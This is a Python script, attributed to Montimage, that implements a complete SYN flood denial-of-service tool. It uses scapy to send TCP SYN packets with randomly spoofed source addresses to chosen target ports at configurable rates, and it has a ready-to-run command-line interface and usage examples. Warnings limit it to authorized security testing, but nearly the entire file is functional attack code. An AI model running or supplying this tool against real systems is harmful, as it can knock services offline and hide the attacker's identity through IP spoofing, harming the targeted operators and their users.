#!/usr/bin/env python3
"""
SYN Flood Attack Simulation

This module provides a class-based implementation for simulating SYN flood attacks,
a type of Denial of Service (DoS) attack that exploits the TCP three-way handshake
by sending numerous SYN packets without completing the handshake.

The module supports various features:
- Customizable packet rate and count
- Random source IP spoofing
- Port targeting (single port or port range)
- Detailed logging and statistics
- Performance monitoring

IMPORTANT ETHICAL AND LEGAL NOTICE:
This tool should ONLY be used for legitimate security testing with proper authorization.
Unauthorized use against systems without explicit permission is illegal and unethical.
The authors assume no liability for misuse of this software.

Usage Examples:
    # Basic usage with command line arguments
    python syn_flood.py -t 192.168.1.10 -p 80
    
    # Target multiple ports with custom packet count
    python syn_flood.py -t 192.168.1.10 -p 80,443,8080 -c 1000
    
    # Specify packet rate
    python syn_flood.py -t 192.168.1.10 -p 80 -r 100

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os
import sys
import time
import random
import socket
import argparse
import ipaddress
from typing import List, Dict, Optional, Any, Tuple, Union, Set

# Add parent directory to path to import logger
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    # Fallback logging if the centralized logger is not available
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

# Get logger for this module
logger = get_logger(__name__)

# Import scapy with error handling
try:
    from scapy.all import IP, TCP, RandIP, RandShort, send, conf
except ImportError:
    logger.error("This script requires the scapy library.")
    logger.error("Install it using: pip install scapy")
    sys.exit(1)

# Suppress scapy warnings
conf.verb = 0


class SYNFloodAttack:
    """
    A class to perform SYN flood attack simulations for security testing.
    
    This class provides methods to generate and send TCP SYN packets to a target,
    without completing the three-way handshake, potentially exhausting the target's
    connection resources.
    
    Attributes:
        target_ip (str): IP address of the target
        ports (List[int]): List of target ports
        packet_count (int): Number of packets to send
        rate (int): Number of packets to send per second
        spoof_ip (bool): Whether to use random source IPs
        verbose (bool): Whether to enable verbose output
    """
    
    def __init__(self, 
                 target_ip: str, 
                 ports: List[int],
                 packet_count: int = 1000,
                 rate: int = 100,
                 spoof_ip: bool = True,
                 verbose: bool = False):
        """
        Initialize the SYN flood attack simulator.
        
        Args:
            target_ip (str): IP address of the target
            ports (List[int]): List of target ports
            packet_count (int, optional): Number of packets to send. Defaults to 1000.
            rate (int, optional): Number of packets to send per second. Defaults to 100.
            spoof_ip (bool, optional): Whether to use random source IPs. Defaults to True.
            verbose (bool, optional): Whether to enable verbose output. Defaults to False.
            
        Raises:
            ValueError: If target_ip is not a valid IP address
            ValueError: If no valid ports are provided
        """
        # Validate target IP
        try:
            ipaddress.ip_address(target_ip)
            self.target_ip = target_ip
        except ValueError:
            raise ValueError(f"Invalid target IP address: {target_ip}")
        
        # Validate ports
        self.ports = []
        for port in ports:
            if 0 < port < 65536:
                self.ports.append(port)
            else:
                logger.warning(f"Invalid port number: {port}, skipping")
        
        if not self.ports:
            raise ValueError("No valid port numbers provided")
        
        # Set other parameters
        self.packet_count = max(1, packet_count)  # Ensure at least 1 packet
        self.rate = max(1, min(rate, 10000))  # Limit rate to reasonable range
        self.spoof_ip = spoof_ip
        self.verbose = verbose
        
        # Calculate delay between packets based on rate
        self.delay = 1.0 / self.rate if self.rate > 0 else 0
        
        # Initialize state variables
        self.packets_sent = 0
        self.start_time = None
        self.end_time = None
        
        # Set scapy verbosity
        conf.verb = 1 if verbose else 0
        
        logger.info(f"Initialized SYN flood attack simulation")
        logger.info(f"Target: {target_ip}, Ports: {', '.join(map(str, self.ports))}")
        if self.verbose:
            logger.info(f"Packet count: {packet_count}, Rate: {rate} packets/second")
            logger.info(f"IP spoofing: {'Enabled' if spoof_ip else 'Disabled'}")
    
    def create_syn_packet(self, port: int) -> IP:
        """
        Create a TCP SYN packet.
        
        Args:
            port (int): Target port number
            
        Returns:
            IP: The constructed IP packet with TCP SYN flag
        """
        # Use random source IP if spoofing is enabled, otherwise use a fixed one
        src_ip = str(RandIP()) if self.spoof_ip else "10.0.0.1"
        
        # Create the packet layers
        ip_layer = IP(dst=self.target_ip, src=src_ip)
        tcp_layer = TCP(
            sport=RandShort(),  # Random source port
            dport=port,         # Destination port
            seq=random.randint(1000, 9000),  # Random sequence number
            flags="S"           # SYN flag
        )
        
        # Combine layers
        packet = ip_layer/tcp_layer
        
        if self.verbose:
            logger.debug(f"Created SYN packet: {src_ip}:{packet[TCP].sport} -> {self.target_ip}:{port}")
        
        return packet
    
    def send_packet(self, port: int) -> bool:
        """
        Send a SYN packet to the target.
        
        Args:
            port (int): Target port number
            
        Returns:
            bool: True if packet sent successfully, False otherwise
        """
        try:
            # Create and send packet
            packet = self.create_syn_packet(port)
            send(packet, verbose=0)
            self.packets_sent += 1
            
            if self.verbose and self.packets_sent % 100 == 0:
                logger.debug(f"Sent {self.packets_sent} packets so far")
                
            return True
            
        except Exception as e:
            logger.error(f"Error sending SYN packet to port {port}: {str(e)}")
            return False
    
    def execute(self) -> Dict[str, Any]:
        """
        Execute the SYN flood attack.
        
        Returns:
            Dict[str, Any]: Statistics about the attack execution
        """
        logger.info(f"Starting SYN flood attack against {self.target_ip}")
        logger.info(f"Sending {self.packet_count} packets at {self.rate} packets/second")
        
        self.start_time = time.time()
        self.packets_sent = 0
        
        try:
            for i in range(1, self.packet_count + 1):
                # Select a random port from the list
                port = random.choice(self.ports)
                
                # Send the packet
                self.send_packet(port)
                
                # Progress reporting
                if i % (self.packet_count // 10 or 1) == 0:
                    progress = (i / self.packet_count) * 100
                    logger.info(f"Progress: {progress:.1f}% ({i}/{self.packet_count} packets)")
                
                # Apply rate limiting
                if self.delay > 0:
                    time.sleep(self.delay)
            
            logger.info("SYN flood attack completed successfully")
            
        except KeyboardInterrupt:
            logger.warning("Attack interrupted by user")
        except Exception as e:
            logger.error(f"Error during attack: {str(e)}")
        finally:
            self.end_time = time.time()
            stats = self._get_statistics()
            self._print_summary(stats)
            return stats
    
    def _get_statistics(self) -> Dict[str, Any]:
        """
        Get statistics about the attack execution.
        
        Returns:
            Dict[str, Any]: Statistics including packets sent, actual rate, etc.
        """
        end_time = self.end_time or time.time()
        start_time = self.start_time or end_time
        duration = end_time - start_time
        
        # Calculate actual packet rate
        actual_rate = self.packets_sent / duration if duration > 0 else 0
        
        # Estimate packet size (very rough estimate)
        avg_packet_size = 60  # bytes
        total_traffic = self.packets_sent * avg_packet_size
        
        return {
            "target_ip": self.target_ip,
            "ports": self.ports,
            "packets_sent": self.packets_sent,
            "duration_seconds": duration,
            "configured_rate": self.rate,
            "actual_rate": actual_rate,
            "rate_efficiency": (actual_rate / self.rate * 100) if self.rate > 0 else 0,
            "estimated_traffic_bytes": total_traffic
        }
    
    def _print_summary(self, stats: Dict[str, Any]) -> None:
        """
        Print a summary of the attack execution.
        
        Args:
            stats (Dict[str, Any]): Statistics from _get_statistics()
        """
        logger.info("=" * 50)
        logger.info("SYN Flood Attack Summary")
        logger.info("=" * 50)
        logger.info(f"Target: {stats['target_ip']}")
        logger.info(f"Ports: {', '.join(map(str, stats['ports']))}")
        logger.info(f"Packets sent: {stats['packets_sent']}")
        logger.info(f"Duration: {stats['duration_seconds']:.2f} seconds")
        logger.info(f"Configured rate: {stats['configured_rate']} packets/second")
        logger.info(f"Actual rate: {stats['actual_rate']:.2f} packets/second")
        logger.info(f"Rate efficiency: {stats['rate_efficiency']:.2f}%")
        logger.info(f"Estimated traffic: {stats['estimated_traffic_bytes']/1024:.2f} KB")
        logger.info("=" * 50)


def parse_port_list(port_str: str) -> List[int]:
    """
    Parse a comma-separated list of ports or port ranges.
    
    Args:
        port_str (str): String containing ports (e.g., "80,443,8000-8080")
        
    Returns:
        List[int]: List of port numbers
    """
    ports = []
    
    # Split by comma
    parts = port_str.split(',')
    
    for part in parts:
        part = part.strip()
        
        # Check if it's a range
        if '-' in part:
            try:
                start, end = map(int, part.split('-', 1))
                # Limit range size to prevent excessive memory usage
                if end - start > 1000:
                    logger.warning(f"Port range {start}-{end} too large, limiting to {start}-{start+1000}")
                    end = start + 1000
                ports.extend(range(start, end + 1))
            except ValueError:
                logger.warning(f"Invalid port range: {part}, skipping")
        else:
            # Single port
            try:
                ports.append(int(part))
            except ValueError:
                logger.warning(f"Invalid port number: {part}, skipping")
    
    # Filter out invalid ports and remove duplicates
    valid_ports = []
    seen = set()
    for port in ports:
        if 0 < port < 65536 and port not in seen:
            valid_ports.append(port)
            seen.add(port)
    
    return valid_ports


def parse_arguments() -> argparse.Namespace:
    """
    Parse command-line arguments for the SYN flood attack.
    
    Returns:
        argparse.Namespace: The parsed command-line arguments
    """
    parser = argparse.ArgumentParser(
        description="SYN Flood Attack Simulation Tool",
        epilog="IMPORTANT: Use only for authorized security testing."
    )
    
    # Required arguments
    parser.add_argument(
        "-t", "--target",
        dest="target_ip",
        required=True,
        help="IP address of the target"
    )
    
    parser.add_argument(
        "-p", "--ports",
        dest="ports",
        required=True,
        help="Target ports (comma-separated, ranges allowed, e.g., '80,443,8000-8080')"
    )
    
    # Optional arguments
    parser.add_argument(
        "-c", "--count",
        dest="packet_count",
        type=int,
        default=1000,
        help="Number of packets to send (default: 1000)"
    )
    
    parser.add_argument(
        "-r", "--rate",
        dest="rate",
        type=int,
        default=100,
        help="Number of packets to send per second (default: 100)"
    )
    
    parser.add_argument(
        "-s", "--spoof",
        dest="spoof_ip",
        action="store_true",
        default=True,
        help="Use random source IPs (default: True)"
    )
    
    parser.add_argument(
        "--no-spoof",
        dest="spoof_ip",
        action="store_false",
        help="Don't use random source IPs"
    )
    
    parser.add_argument(
        "-v", "--verbose",
        dest="verbose",
        action="store_true",
        help="Enable verbose output"
    )
    
    return parser.parse_args()


def main() -> None:
    """
    Main entry point for the SYN flood attack simulation.
    """
    # Display ethical notice
    print("=" * 80)
    print("WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY")
    print("Using this tool against systems without permission is ILLEGAL")
    print("The authors assume NO LIABILITY for misuse of this software")
    print("=" * 80)
    print()
    
    try:
        # Parse command-line arguments
        args = parse_arguments()
        
        # Parse ports
        ports = parse_port_list(args.ports)
        if not ports:
            logger.error("No valid ports specified")
            sys.exit(1)
        
        # Create and execute the attack
        attack = SYNFloodAttack(
            target_ip=args.target_ip,
            ports=ports,
            packet_count=args.packet_count,
            rate=args.rate,
            spoof_ip=args.spoof_ip,
            verbose=args.verbose
        )
        
        # Execute the attack
        attack.execute()
        
    except KeyboardInterrupt:
        print("\nAttack simulation interrupted by user")
        sys.exit(0)
        
    except Exception as e:
        logger.error(f"Unhandled error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
